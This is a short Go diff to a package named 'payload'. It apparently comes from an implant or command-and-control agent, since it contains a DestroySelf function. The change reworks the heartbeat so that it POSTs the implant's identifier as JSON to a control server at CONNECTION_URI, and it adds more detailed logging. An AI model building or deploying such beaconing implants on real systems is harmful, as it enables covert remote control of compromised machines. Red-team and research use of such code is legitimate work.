@@ -1,6 +1,8 @@
 package payload
 
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"net/http"
 	"time"
@@ -32,11 +34,25 @@ func DestroySelf() {
 }
 
 func SendHeartbeat() {
-	response, error := http.Get(fmt.Sprintf("%s/heartbeat", CONNECTION_URI))
-	if error != nil || response.StatusCode != 200 {
+	values := map[string]string{
+		"id": SELF_IDENTIFIER,
+	}
+	jsonBody, encodingErr := json.Marshal(values)
+
+	if encodingErr != nil {
+		logger.CustomInfo("PayloadService", "Failed to generate JSON Request body.")
+	}
+
+	response, error := http.Post(fmt.Sprintf("%s/heartbeat", CONNECTION_URI), "application/json", bytes.NewBuffer(jsonBody))
+	if error != nil {
+		logger.CustomError("PayloadService", fmt.Sprintf("Failed to send heartbeat with error `%s`", fmt.Sprint(error)))
+	} else if response.StatusCode != 200 {
+		logger.CustomError("PayloadService", fmt.Sprintf("Received error heartbeat response with status code %d", response.StatusCode))
+	} else {
+		logger.CustomInfo("PayloadService", fmt.Sprintf("Received heartbeat response with status code %d", response.StatusCode))
 		defer response.Body.Close()
-		logger.CustomError("PayloadService", fmt.Sprintf("Failed to send heartbeat with error %s", error.Error()))
-	} else if response.StatusCode == 200 {
-		logger.CustomInfo("PayloadService", fmt.Sprintf("Checked in with server successfully."))
+		if response.StatusCode == 200 {
+			logger.CustomInfo("PayloadService", "Checked in with server successfully.")
+		}
 	}
 }
